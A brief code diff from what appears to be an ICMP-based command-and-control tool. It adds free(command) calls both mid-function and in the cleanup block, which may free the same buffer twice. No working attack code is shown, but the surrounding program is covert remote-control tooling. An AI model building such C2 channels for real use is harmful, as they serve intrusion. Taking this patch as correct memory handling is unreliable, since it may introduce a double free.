@@ -119,6 +119,8 @@ void interact(int sockfd) {
 
         c2_append_to_data_section(icmp, command);
 
+        free(command);
+
         c2_prep_icmp_headers(icmp, strlen((char *) input));
 
         // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
@@ -150,6 +152,7 @@ out:
     free(input);
     free(cipher_text);
     free(packet);
+    free(command);
     return;
 }
 
